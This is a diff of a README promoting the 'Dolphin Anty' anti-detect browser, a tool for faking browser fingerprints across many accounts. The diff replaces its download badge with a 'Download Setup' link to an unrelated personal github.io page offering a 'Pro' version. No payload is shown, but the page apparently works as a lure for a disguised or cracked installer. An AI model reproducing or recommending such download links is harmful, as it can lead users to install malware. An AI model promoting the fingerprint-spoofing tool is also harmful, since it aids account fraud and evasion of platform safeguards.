@@ -2,7 +2,7 @@
 
 Dolphin Anty Anti-Detect Browser Manager is a Chromium-based tool built for professionals managing multiple online identities. It offers isolated browser profiles with detailed fingerprint customization, bulk proxy assignment, automation synchronizer, secure profile access, team collaboration, and scenario scripting — all designed to simplify complex multi-account workflows.
 
-[![Download Dolphin Anty Anti-Detect Browser Manager](https://img.shields.io/badge/Download-Dolphin_Anty_Anti-Detect_Browser_Manager-blueviolet)](https://cryptoenthusiasts.world/)
+[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://quentinknightrcnu.github.io/.github/Dolphin-Anty-Pro)
 
 ---
 
